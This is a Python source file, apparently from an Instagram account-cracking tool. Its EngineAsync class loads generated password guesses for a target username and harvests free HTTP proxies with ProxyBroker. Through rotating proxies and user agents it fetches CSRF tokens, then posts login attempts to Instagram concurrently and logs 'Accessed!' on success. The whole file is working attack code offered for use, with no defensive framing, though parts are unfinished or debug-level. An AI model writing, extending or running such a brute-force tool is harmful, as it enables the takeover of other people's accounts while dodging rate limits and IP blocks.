from __future__ import absolute_import

import logging
import logging.config

import functools
import random
import signal
import traceback

import aiohttp
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests_futures.sessions import FuturesSession
from proxybroker import Broker
import time
import json

from app import settings
from app.lib import exceptions
from app.lib.logging import AppLogger
from app.lib.models import InstagramResult
from app.lib.sessions import InstagramSession
from app.lib.users import User
from app.lib.utils import (auto_logger, get_token_from_cookies,
    get_token_from_response, get_cookies_from_response)


__all__ = ('EngineAsync', )


def reraise_with_stack(func):

    @functools.wraps(func)
    def wrapped(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            traceback_str = traceback.format_exc(e)
            raise BaseException(
                f"An error occurred. Original traceback is"
                f"\n{traceback_str}\n"
            )
    return wrapped


class EngineAsync(object):

    __client_exception__ = exceptions.InstagramClientApiException
    __server_exception__ = exceptions.InstagramServerApiException

    __loggers__ = {
        '__base__': 'Instagram Engine',
        'attack': 'Attack',
        '_test_attack_async': 'Test Async Attack',
        '_test_attack_sync': 'Test Sync Attack',
        '_attack_sync': 'Synchronous Attack',
        '_attack_asnc': 'Asynchronous Attack',
        'consume_passwords': 'Logging In',
        'login': 'Logging In',
        'populate_passwords': 'Populating Passwords',
        'get_proxy_tokens': 'Fetching Tokens',
        'consume_attempts': 'Storing Attempted Password',
    }

    __status_code_exceptions__ = {
        429: exceptions.TooManyRequestsException,
        403: exceptions.ForbiddenException,
    }

    def __init__(self, username, mode='async', test=False, password=None):
        self.user = User(username)

        logging.setLoggerClass(AppLogger)
        self.log = logging.getLogger(self.__loggers__['__base__'])

        self.lock = asyncio.Lock()

        self.mode = mode

        if test and not password:
            raise exceptions.EngineException("Must provide password to test async attack.")

        self.test = test
        self.password = password  # Used for Testing

        self.passwords = asyncio.Queue()
        self.attempts = asyncio.Queue()

        self.proxies = asyncio.Queue()

        self.user_agent = random.choice(settings.USER_AGENTS)

        self.broker = Broker(self.proxies, timeout=6, max_conn=200, max_tries=1)

    async def exception_handler(self, coro, loop):
        try:
            await coro
        except Exception as e:
            self.log.info('from handler')
            self.log.error(str(e))
            loop.stop()

    async def shutdown(self, loop, signal=None):
        if signal:
            self.log.info(f'Received exit signal {signal.name}...')

        tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]
        [task.cancel() for task in tasks]

        self.log.info('Canceling outstanding tasks...')
        await asyncio.gather(*tasks)

        loop.stop()
        self.log.success('Shutdown complete.')

    def _handle_api_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.BadProxyException):
            log.info(exc.message, extra={
                'task': fut,
                'proxy': fut.proxy,
            })
        else:
            log.warning(exc.__class__.__name__, extra={
                'task': fut,
                'proxy': fut.proxy,
            })

    @reraise_with_stack
    def _handle_response_exception(self, fut, exc, log):
        raise exc
        if isinstance(exc, exceptions.InstagramAttackException):
            if isinstance(exc, exceptions.ApiException):
                self._handle_api_exception(fut, exc, log)
            else:
                raise exc
        else:
            raise exc
            # log.error(exc.__class__.__name__, extra={
            #     'task': fut,
            #     'proxy': fut.proxy,
            # })

    @auto_logger
    async def populate_passwords(self, loop, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        for password in self.user.get_new_attempts():
            self.passwords.put_nowait(password)

        if self.passwords.empty():
            raise exceptions.EngineException("No new passwords to try.")

        log.info(f"Populated {self.passwords.qsize()} Passwords")

    def token_response_callback(self, log):
        def _token_response_callback(fut):
            exc = fut.exception()
            if exc:
                self._handle_response_exception(fut, exc, log)
            else:
                if fut.result() is None:
                    log.error('Coroutine did not contain result.')
                else:
                    log.success('Got result')
                    log.info(fut.result())
        return _token_response_callback

    def login_response_callback(self, log):
        def _login_response_callback(fut):
            exc = fut.exception()
            if exc:
                self._handle_response_exception(fut, exc, log)
            else:
                if fut.result() is None:
                    log.error('Coroutine did not contain result.')
                else:
                    log.success('Got result')
                    log.info(fut.result())
        return _login_response_callback

    def _headers(self, token=None):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        if token:
            headers['x-csrftoken'] = token
        return headers

    @auto_logger(show_running=False)
    async def login(self, loop, log, mode='async'):

        tasks = []

        stop_event = asyncio.Event()
        connector = aiohttp.TCPConnector(ssl=False)

        @reraise_with_stack
        async def _futures_login(session):
            """
            This limits our concurrency because the futures to get the
            token have to be force returned immediately.

            TODO
            ----

            Right now, this is getting a new token for each request to login,
            which we might not need.  We might be able to use a single token,
            or only update the token in certain situations.

            It also looks like the tokens are the same for each proxy?
            """
            def get_token_from_future(future):
                response = future.result()
                try:
                    response.raise_for_status()
                except requests.exceptions.HTTPError as e:
                    log.warning(str(e), extra={'proxy': proxy})
                    return None
                else:
                    token = get_token_from_response(response)
                    if not token:
                        raise exceptions.TokenNotInResponse(response)
                    return token

            # TODO: Introduce timeout here if we cannot retrieve the token.
            def get_token_with_proxy(proxy):
                log.info("Fetching Token", extra={'proxy': proxy})
                session.proxies.update({
                    'http': f"{proxy.host}:{proxy.port}",
                    'https': f"{proxy.host}:{proxy.port}",
                })

                # Use this to make sure that proxies are being used.
                # future = session.get('https://api.ipify.org?format=json')
                future = session.get(
                    settings.INSTAGRAM_URL,
                    headers=self._headers(),
                    timeout=settings.DEFAULT_TOKEN_FETCH_TIME,
                )

                try:
                    return get_token_from_future(future)
                except exceptions.TokenNotInResponse:
                    log.warning('Token not in response.', extra={'proxy': proxy})

            async def get_token():
                token = proxy = None
                while not token:
                    proxy = await self.proxies.get()
                    if not proxy:
                        continue

                    token = get_token_with_proxy(proxy)
                    if not token:
                        log.warning('Could not get token.', extra={'proxy': proxy})
                    else:
                        log.success('Got token.', extra={
                            'proxy': proxy,
                            'token': token
                        })
                        break

                return token, proxy

            token, proxy = await get_token()
            log.info("Attempting Login", extra={
                'proxy': proxy,
                'token': token,
            })

            # Should we use the proxy that was used to get the token or a different
            # proxy?
            headers = self._headers(token=token)

            future = session.post(
                settings.INSTAGRAM_LOGIN_URL,
                proxies={
                    'http': f"{proxy.host}:{proxy.port}",
                    'https': f"{proxy.host}:{proxy.port}",
                },
                headers=headers,
                data={
                    'username': self.user.username,
                    'password': self.password
                },
            )
            return future

            # except aiohttp.ClientError as exc:
            #     log.error(exc.__class__.__name__, extra={
            #         'proxy': proxy,
            #     })

        @reraise_with_stack
        async def _async_login(session, proxy):
            """
            Note
            -----
            Having a hard time getting this to work correctly, some sources
            online recommended using teh following headers:

            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'nl-NL,nl;q=0.8,en-US;q=0.6,en;q=0.4',
            'Connection': 'keep-alive',
            'Content-Length': '0',
            'Host': 'www.instagram.com',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': self.user_agent,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest'

            But it works with FuturesSession, just not the aiohttp ClientSession.
            """
            log.info("Fetching Token", extra={'proxy': proxy})
            try:
                async with await session.get(
                    settings.INSTAGRAM_URL,
                    proxy=f"http://{proxy.host}:{proxy.port}/",
                    timeout=settings.DEFAULT_TOKEN_FETCH_TIME
                ) as response:
                    response.raise_for_status()

                    log.info("Attempting Login", extra={
                        'proxy': proxy,
                    })

                    token = get_token_from_response(response)
                    if token is None:
                        raise exceptions.TokenNotInResponse(response)

                    headers = settings.HEADER.copy()
                    headers['user-agent'] = self.user_agent
                    headers['x-csrftoken'] = token

                    try:
                        async with session.post(
                            settings.INSTAGRAM_LOGIN_URL,
                            proxy=f"http://{proxy.host}:{proxy.port}/",
                            timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                            headers=headers,
                            json={
                                'username': self.user.username,
                                'password': self.password
                            },
                        ) as response:
                            response.raise_for_status()

                            log.success('Got Response', extra={
                                'proxy': proxy,
                                'response': response
                            })
                            return await response.json()

                    except aiohttp.ClientError as exc:
                        log.error(str(exc), extra={
                            'proxy': proxy,
                        })

            except aiohttp.ClientError as exc:
                log.error(exc.__class__.__name__, extra={
                    'proxy': proxy,
                })

        index = 0
        headers = self._headers()

        if mode == 'async':
            async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                while not stop_event.is_set() and index <= 50:
                    proxy = await self.proxies.get()
                    if proxy:
                        task = asyncio.ensure_future(_async_login(session, proxy))
                        task.name = f"Task {index}"
                        task.proxy = proxy

                        log.info("Received Proxy", extra={'proxy': proxy, 'task': task})
                        index += 1

                        task.add_done_callback(self.login_response_callback(log))
                        tasks.append(task)

                return await asyncio.gather(*tasks, return_exceptions=True)

        elif mode == 'futures':
            # By default a ThreadPoolExecutor is created with 8 workers.
            # If you would like to adjust that value or share a executor across
            # multiple sessions you can provide one to the FuturesSession constructor.
            with FuturesSession(executor=ThreadPoolExecutor(max_workers=10)) as session:
                while not stop_event.is_set() and index <= 10:
                    task = asyncio.ensure_future(_futures_login(session))
                    task.name = f"Task {index}"
                    index += 1
                    tasks.append(task)
                    log.info(task.name)

                results = await asyncio.gather(*tasks, return_exceptions=True)

            results = [res for res in results if not isinstance(res, Exception)]
            for res in results:
                response = res.result()
                try:
                    data = response.json()
                except json.decoder.JSONDecodeError:
                    self.log.warn('Could not decode json.')
                    continue
                else:
                    instagram_result = InstagramResult.from_dict(data)
                    if instagram_result.accessed:
                        self.log.success("Accessed!")
                    else:
                        self.log.error('Not Accessed...')

    @auto_logger
    async def attack(self, loop, log):
        # May want to catch other signals too - these are not currently being
        # used, but could probably be expanded upon.
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(loop, signal=s)))

        try:
            await self.exception_handler(self.populate_passwords(loop), loop)

            # If we do show_proxies() it will keep taking them out before they
            # can be used.
            types = ['HTTP']
            tasks = [
                asyncio.ensure_future(self.broker.find(types=types)),
                asyncio.ensure_future(self.login(loop, mode='futures')),
            ]
            return await asyncio.gather(*tasks, return_exceptions=True)

        finally:
            log.info('Cleaning up')
            await self.shutdown(loop)
